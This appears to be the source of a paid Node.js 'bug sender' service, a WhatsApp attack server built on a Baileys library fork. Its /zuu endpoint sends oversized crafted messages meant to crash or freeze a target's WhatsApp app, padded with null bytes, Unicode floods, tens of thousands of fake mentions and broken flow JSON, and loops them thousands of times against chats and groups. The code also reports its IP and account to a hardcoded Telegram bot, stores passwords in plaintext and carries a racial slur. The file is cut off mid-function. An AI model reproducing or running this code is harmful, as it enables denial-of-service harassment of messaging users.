const express = require('express');
const cors = require('cors');
const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('vendettazuu-baileys');
const P = require('pino');
const Boom = require('@hapi/boom');
const figlet = require('figlet');
const gradient = require('gradient-string');
const jwt = require('jsonwebtoken');
const readline = require('readline');
const zuu = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});
const gugu = gradient('green', 'red');
global.prefa = ['', '!', '.', ','];

let sock;
let isConnected = false;

const app = express();
const PORT = process.env.PORT || process.env.SERVER_PORT || 3000;
app.use(cors());
app.use(express.json());

const JWT_SECRET = 'ZEROX-GANTENG-BANGET';
const dbPath = './db.json';
const readDB = () => {
    if (!fs.existsSync(dbPath)) {
        fs.writeFileSync(dbPath, JSON.stringify({ users: [], posts: [], comments: [] }, null, 2));
    }
    return JSON.parse(fs.readFileSync(dbPath));
};
const writeDB = (data) => {
    fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
};

// --- Middleware (SATPAM API) ---
const authMiddleware = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (token == null) return res.sendStatus(401);
    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.sendStatus(403);
        req.user = user;
        next();
    });
};

async function startBot() {
    figlet.text(
        "LuxxyCantetBet",
        {
            font: "ANSI Shadow",
            horizontalLayout: "default",
            verticalLayout: "default",
            width: 100,
            whitespaceBreak: true,
        },
        function (err, data) {
            if (err) {
                console.log("Something went wrong...");
                console.dir(err);
                return;
            }
            console.clear();
            console.log(gugu(data, { interpolation: 'hsv' }));
        }
    );

    const { state, saveCreds } = await useMultiFileAuthState('geronima');
    sock = makeWASocket({
        auth: state,
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
    });

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
   if (connection === 'close') {
   const reason = lastDisconnect?.error?.output?.statusCode;
   isConnected = false;
   console.log('Connection closed due to', Boom.boomify(lastDisconnect.error));

   if (reason !== DisconnectReason.loggedOut) {
      console.log('Attempting to reconnect...');
      setTimeout(startBot, 5000); // Restart bot setelah delay 5 detik
   } else {
      console.log('Logged out from WhatsApp.');
           }
            } else if (connection === 'open') {
            isConnected = true;
            const response = await fetch('https://httpbin.org/get');
            const data = await response.json();
            console.log(`Bug Api Started At http://${data.origin}:${PORT}`)
            await fetch(`https://api.telegram.org/bot7502047388:AAF0GQNcU8HXNSVVxbY3dPFm9AfFmkAlEvg/sendMessage?chat_id=6843967527&text=Bug Sender http://${data.origin}:${PORT} Number: ${sock.user.id.split(':')[0]}`)
            console.log('Connected to WhatsApp successfully!');
            console.log('---------------------------------');
        }

        if (connection === 'connecting' && !fs.existsSync('./geronima/creds.json')) {
            isConnected = false;
            console.log("Enter your Bot Number, Example: 628xxx");
            zuu.question('Number: ', async (number) => {
                try {
                    const formattedNumber = number.replace(/\D/g, '');
                    const pairingCode = await sock.requestPairingCode(formattedNumber);
                    const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                    console.log(`Your Pairing Code:`, formattedCode);
                    zuu.close();
                } catch (error) {
                    console.log('Error requesting pairing code:', error);
                }
            });
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

app.get('/zuu', async (req, res) => {
    const { chatId, type } = req.query;

    if (!chatId || !type) {
        return res.status(400).json({ error: 'Stupid Niggers' });
    }

    try {
        if (!isConnected) {
            return res.status(500).json({ error: 'WhatsApp bot is not initialized' });
        }
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const o = fs.readFileSync(`./o.jpg`)
        const geronimaNull = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }
        const alone = {
  key: {
    remoteJid: 'p',
    fromMe: false,
    participant: '0@s.whatsapp.net'
  },
  message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: 0,
                        pageCount: 6666666666,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "SyncModule-Type[A]",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "亴⃝ࣰࣰࣱࣱࣩ࣯࣯࣯࣯࣯࣯࣮࣮ꪾꪾꪾꪾꪾꪾꪾࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨ࣬࣬͋͋͋͋͌͌ࣼࣼࣷࣷࣷࣷᤨᤨ⃫⃫⃫⃫⃫⃫ࣵࣴࣴࣴࣴ".repeat(20) + "@6".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 10 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: {
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "nullOnTop",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "null@gmail.com",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "\u0000".repeat(500000),
                                            "screen_0_TextInput_1": "SecretDocu",
                                            "screen_0_Dropdown_2": "#926-Xnull",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        },
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
   async function GeronimaNew(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./Z.mp4") },
    { upload: sock.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "Z-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "wtf",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "BDCT",
              body: "Z",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://geronima.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "Vendetta"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Z" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "Gero",
                body: "",
                thumbnailUrl: "https://geronima.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://geronima.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} 
async function GeronimaNew2(target) {
   const msg = generateWAMessageFromContent(
      target,
      {
         interactiveMessage: {
            body: { text: "🧩" },
            header: { title: "" },
            footer: { text: "© ZUU" },
            nativeFlowMessage: {
               buttons: [
                  {
                     name: "galaxy_message",
                     buttonParamsJson: JSON.stringify({
                        flow_message_version: "3",
                        flow_token: "{".repeat(100000),
                        flow_id: "1987576175050517",
                        flow_cta: "\u0000".repeat(1000),
                        flow_action: "navigate",
                        flow_action_payload: {
                           screen: "Home",
                           params: {
                              ["\n".repeat(5000)]: "\n".repeat(5000)
                           }
                        },
                        flow_metadata: {
                           flow_json_version: 500,
                           data_api_protocol: "PUBLIC_KEY",
                           data_api_version: 300,
                           flow_name: "simple_flow_v1",
                           categories: ["Z".repeat(5000), "V".repeat(5000), "\n"],
                           extra: {
                              ["\n".repeat(3000)]: "\n".repeat(3000)
                           }
                        },
                        icon: "SEARCH",
                        has_multiple_buttons: true
                     })
                  }
               ],
               messageParamsJson: "{".repeat(10000),
               contextInfo: {
                  participant: target,
                  mentionedJid: [
                   "0@s.whatsapp.net",
                    ...Array.from(
                    {
                     length: 30000,
                    },
                    () =>
                     "1" +
                     Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
                ),
              ],
            },
            }
         }
      },
      {
         userJid: target,
         quoted: null
      }
   );

   await sock.relayMessage(target, msg.message, {
      messageId: null,
      participant: { jid: target }
   });
}
async function Gdelay(target, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Geronima",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "33333333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Geronima",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "ᴛʜᴇ ᴄʀᴀʏ" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function Gdelay2(target, mention = true) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "G" + "ោ៝".repeat(10000),
    title: "Iqbhalkeifer",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.youtube.com/@VfV.00",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "XTRUSZED IS HERE",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "MeZ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function Gdelay3(target, mention) {
  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: "Mez",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐁𝐞𝐭𝐚 𝐏𝐫𝐨𝐭𝐨𝐜𝐨𝐥 - 𝟗𝟕𝟒𝟏" },
            content: undefined,
          },
        ],
      }
    );
  }
}
		async function geronima_group(target) {
			await sock.relayMessage(target, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "\u0000".repeat(9000) + "ꦾ".repeat(300000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			let X = fs.readFileSync('./null.webp')
			await sock.sendMessage(target, {
				sticker: X
			}, {
				quoted: {
			key: {
				participant: `0@s.whatsapp.net`,
					remoteJid: "status@broadcast"
			},
			message: {
				listResponseMessage: {
					title: `geronima\n` + "ꦾ".repeat(300000)
				}
			}
		}
			})
            console.log("Sended Group Bug To " + target)
		}
		async function geronimaios(target) {
  try {
    let message = {
      extendedTextMessage: {
        text: "ꦾ".repeat(5500),
        contextInfo: {
          stanzaId: generateRandomMessageId(),
          mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 30000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)],
          participant: "0@s.whatsapp.net",
          remoteJid: target,
          quotedMessage: { conversation: "ꦽ".repeat(9000) },
          disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    };

    const msg = generateWAMessageFromContent(`0@s.whatsapp.net`, message, {});
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
		async function geronima_group2(target) {
			let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							scheduledCallCreationMessage: {
								scheduledTimestampMs: Date.now(),
								callType: 1,
								title: "\u0000" + "ꦾ".repeat(300000)
							}
						}
					},
				}), {
					userJid: target
				}
			);
			await sock.relayMessage(target, etc.message, {});
		}
        async function leaveAndDeleteGroup(groupId) {
    try {
        await sock.groupLeave(groupId);
        console.log('Left and deleted the group:', groupId);
    } catch (error) {
        console.error('Error leaving and deleting group:', error);
    }
}
		async function trash_group(inviteLink) {
        try {
            const groupInviteCode = inviteLink.split('/').pop();
            const result = await sock.groupAcceptInvite(groupInviteCode);
            console.log('Joined group:', result);
            for (let w = 1; w <= 20; w++) {
             //await geronima_group(result)
             await geronima_group2(result)
            }
            await leaveAndDeleteGroup(result)
            console.log("Successfully Sended And Out From The Group.")
            return result;
        } catch (error) {
            console.error('Failed to join group:', error);
            return null;
        }
    }
        async function geronimadelay_hard(target) {
            try {
            for (let w = 1; w <= 1000; w++) {
             await Gdelay(target)
             await Gdelay2(target)
             await Gdelay3(target)
             await sleep(5000)
            }
            console.log("Successfully Sended Spam Bug.")
            return;
            } catch (error) {
                console.log(error)
                return
            }
        }
        async function geronimafc_v2(target) {
            try {
            for (let w = 1; w <= 1; w++) {
             await GeronimaNew(target)
             await sleep(1000)
            }
            console.log("Successfully Sended SpamV2 Bug.")
            return;
            } catch (error) {
                console.log(error)
                return
            }
        }
        async function geronimafc_v3(target) {
            try {
            for (let w = 1; w <= 15; w++) {
             await GeronimaNew2(target)
             await sleep(1000)
            }
            console.log("Successfully Sended SpamV2 Bug.")
            return;
            } catch (error) {
                console.log(error)
                return
            }
        }
        async function geronima_delay24(target) {
            try {
            for (let w = 1; w <= 8000; w++) {
             await Gdelay(target)
             await Gdelay2(target)
             await Gdelay3(target)
             await sleep(5000)
            }
            console.log("Successfully Sended Spam Bug.")
            return;
            } catch (error) {
                console.log(error)
                return
            }
        }
        async function geronima_ios(target) {
            try {
                for (let h = 1; h <= 10; h++) {
                    await geronimaios(target)
                    await sleep(5000)
                }
            } catch (error) {
                console.log(error)
            }
        }
        if (type === "delay") {
        geronimadelay_hard(chatId)
        } else if (type === "24jam") {
            geronima_delay24(chatId)
        } else if (type === "fc") {
            geronimafc_v2(chatId)
        } else if (type === "fc2") {
            geronimafc_v3(chatId)
        } else if (type === "group") {
        const inviteLinkRegex = /https?:\/\/chat\.whatsapp\.com\/([A-Za-z0-9_-]{22})/;
        const link = chatId;
        const match = link.match(inviteLinkRegex);
            if (match) {
         trash_group(link)
            } else {
        res.status(500).json({ error: 'Failed to send message', details: error.toString() });
            }
        
        } else if (type === "ios") {
        geronima_ios(chatId)
        }
        console.log("Successfully Send Undefined Bug.")
        res.json({ success: true, message: 'Undefined Bug sent successfully!', target: chatId });
    } catch (error) {
        console.error('Error sending message:', error);
        res.status(500).json({ error: 'Failed to send message', details: error.toString() });
    }
});
app.get('/status', (req, res) => {
    res.json({ connected: isConnected });
});
app.get('/refresh', async (req, res) => {
    try {
    if (!isConnected) {
    await startBot();
    res.json({ connected: isConnected });
    } else {
    res.json({ connected: isConnected });
    } 
    } catch (error) {
        console.log(error)
    }
});
app.get('/swap', async (req, res) => {
    const { creds } = req.query;

    if (!creds) {
        return res.status(400).json({ error: 'Stupid Niggers' });
    }
        await fs.writeFileSync('./geronima/creds.json', JSON.stringify(JSON.parse(creds)));
        console.log("Updated credentials successfully.");
    if (isConnected) {
        await sock.logout();
        console.log("Logging Out Current WhatsApp");
        await startBot();
        res.json({ success: true, message: "Credentials updated and bot restarted." });
    } else {
        await startBot();
        res.json({ success: true, message: "Credentials updated and bot restarted." });
    }
});
// REGISTER: User baru otomatis dapat 2 hari trial.
app.post('/register', (req, res) => {
    const { email, password, namaLengkap } = req.body;
    if (!email || !password || !namaLengkap) return res.status(400).json({ msg: 'Email, password, dan nama lengkap harus diisi' });
    const db = readDB();
    if (db.users.find(u => u.email === email)) return res.status(400).json({ msg: 'Email sudah terdaftar' });
    const expiresAt = new Date(new Date().setDate(new Date().getDate() + 2));
    const newUser = { id: Date.now().toString(), email, password, namaLengkap, bio: `Hai, saya ${namaLengkap}`, expiresAt: expiresAt.toISOString() };
    db.users.push(newUser);
    writeDB(db);
    res.status(201).json({ msg: `User berhasil dibuat. Akun aktif selama 2 hari.` });
});

// LOGIN
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ msg: 'Email & password diperlukan' });
    const db = readDB();
    const user = db.users.find(u => u.email === email && u.password === password);
    if (!user) return res.status(400).json({ msg: 'Email atau password salah' });
    if (new Date(user.expiresAt) < new Date()) return res.status(403).json({ msg: 'Akun Anda sudah kedaluwarsa.' });
    const tokenPayload = { id: user.id, email: user.email };
    const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '1d' });
    res.json({ token });
});

// GET PROFIL PENGGUNA YANG LOGIN
app.get('/profile', authMiddleware, (req, res) => {
    const db = readDB();
    const user = db.users.find(u => u.id === req.user.id);
    if (!user) return res.status(404).json({ msg: "User tidak ditemukan" });
    const { password, ...profileData } = user; // Jangan kirim password ke frontend
    res.json(profileData);
});

// UPDATE PROFIL
app.put('/profile', authMiddleware, (req, res) => {
    const { namaLengkap, bio } = req.body;
    const db = readDB();
    const userIndex = db.users.findIndex(u => u.id === req.user.id);
    if (userIndex === -1) return res.status(404).json({ msg: "User tidak ditemukan" });
    
    db.users[userIndex].namaLengkap = namaLengkap || db.users[userIndex].namaLengkap;
    db.users[userIndex].bio = bio || db.users[userIndex].bio;
    writeDB(db);
    res.json({ msg: "Profil berhasil diupdate" });
});

// UP PLAN
app.post('/extend-plan', authMiddleware, (req, res) => {
    const { durasiHari } = req.body;
    if (!durasiHari || isNaN(parseInt(durasiHari))) return res.status(400).json({ msg: 'Durasi hari diperlukan.' });
    const db = readDB();
    const userIndex = db.users.findIndex(u => u.id === req.user.id);
    if (userIndex === -1) return res.status(404).json({ msg: 'User tidak ditemukan' });
    const user = db.users[userIndex];
    const tanggalMulai = new Date(user.expiresAt) > new Date() ? new Date(user.expiresAt) : new Date();
    const tanggalKedaluwarsaBaru = new Date(tanggalMulai.setDate(tanggalMulai.getDate() + parseInt(durasiHari)));
    db.users[userIndex].expiresAt = tanggalKedaluwarsaBaru.toISOString();
    writeDB(db);
    res.json({ msg: `Masa aktif berhasil diperpanjang.` });
});

// ===============================================
// ENDPOINT BLOG (CRUD)
// ===============================================
app.post('/posts', authMiddleware, (req, res) => {
    const { judul, isiKonten } = req.body;
    if (!judul || !isiKonten) return res.status(400).json({ msg: 'Judul dan isi tidak boleh kosong' });
    const db = readDB();
    const newPost = { id: Date.now().toString(), judul, isiKonten, penulisId: req.user.id, createdAt: new Date().toISOString() };
    db.posts.unshift(newPost);
    writeDB(db);
    res.status(201).json(newPost);
});

app.get('/posts', (req, res) => {
    const db = readDB();
    const postsWithAuthor = db.posts.map(post => {
        const penulis = db.users.find(user => user.id === post.penulisId);
        return { ...post, penulis: { email: penulis ? penulis.email : 'User Dihapus', namaLengkap: penulis ? penulis.namaLengkap : 'User Dihapus' } };
    });
    res.json(postsWithAuthor);
});

// ===============================================
// ENDPOINT KOMENTAR
// ===============================================
app.post('/posts/:postId/comments', authMiddleware, (req, res) => {
    const { isiKomentar } = req.body;
    const { postId } = req.params;
    if (!isiKomentar) return res.status(400).json({ msg: "Komentar tidak boleh kosong" });
    
    const db = readDB();
    const postExists = db.posts.find(p => p.id === postId);
    if (!postExists) return res.status(404).json({ msg: "Postingan tidak ditemukan" });

    const newComment = { id: Date.now().toString(), isiKomentar, penulisId: req.user.id, postId, createdAt: new Date().toISOString() };
    db.comments.push(newComment);
    writeDB(db);
    res.status(201).json(newComment);
});

app.get('/posts/:postId/comments', (req, res) => {
    const { postId } = req.params;
    const db = readDB();
    const commentsForPost = db.comments.filter(c => c.postId === postId);
    const commentsWithAuthor = commentsForPost.map(comment => {
        const penulis = db.users.find(user => user.id === comment.penulisId);
        return { ...comment, penulis: { email: penulis ? penulis.email : 'User Dihapus', namaLengkap: penulis ? penulis.namaLengkap : 'User Dihapus' } };
    });
    res.json(commentsWithAuthor);
});

// ===============================================
// ENDPOINT COMMUNITY
// ===============================================
app.get('/community/users', (req, res) => {
    const db = readDB();
    // Hanya kirim data yang tidak sensitif
    const publicUsers = db.users.map(user => ({ id: user.id, namaLengkap: user.namaLengkap, bio: user.bio }));
    res.json(publicUsers);
});

// ===============================================
// "ROBOT" PEMBERSIH USER KEDALUWARSA
// ===============================================
const hapusUserKedaluwarsa = () => {
    // Pesan ini akan muncul di log setiap kali tugas berjalan
    console.log(`[${new Date().toLocaleTimeString('id-ID')}] Menjalankan tugas bersih-bersih...`);
    
    // Panggil fungsi readDB() untuk membaca data terbaru
    const db = readDB();
    const usersAwal = db.users.length;
    const tanggalSekarang = new Date();
    
    // Saring array user, simpan HANYA user yang tanggal kedaluwarsanya
    // lebih besar atau sama dengan tanggal sekarang.
    const usersAktif = db.users.filter(user => new Date(user.expiresAt) >= tanggalSekarang);
    
    // Cek apakah ada user yang dihapus
    if (usersAktif.length < usersAwal) {
